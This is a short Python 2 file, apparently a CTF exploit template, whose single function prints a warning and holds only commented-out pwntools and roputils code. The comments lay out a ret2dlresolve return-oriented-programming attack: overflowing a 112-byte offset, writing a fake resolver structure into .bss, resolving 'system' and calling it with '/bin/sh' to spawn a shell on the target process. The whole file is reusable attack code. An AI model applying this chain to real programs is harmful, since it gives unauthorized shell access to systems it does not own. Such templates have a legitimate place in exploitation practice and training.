# -*- coding:utf-8 -*-
def dlresolve(bin_path):
    print "warning: just a template"
    # from roputils import *
    # from pwn import process
    # from pwn import gdb
    # from pwn import context
    # from pwn import remote
    # r = process('./main')
    # context.log_level = 'debug'
    # rop = ROP(bin_path)
    # offset = 112
    # bss_base = rop.section('.bss')
    # # first: ROP chain
    # buf = rop.fill(offset)
    # # read the fake struct into memory
    # buf += rop.call('read', 0, bss_base, 100)
    # # used to call dl_Resolve(function_name, args_ptr)
    # buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    # r.send(buf)
    # # second: write the fake struct into bss
    # buf = rop.string('/bin/sh')
    # buf += rop.fill(20, buf)
    # buf += rop.dl_resolve_data(bss_base + 20, 'system')
    # buf += rop.fill(100, buf)
    # r.send(buf)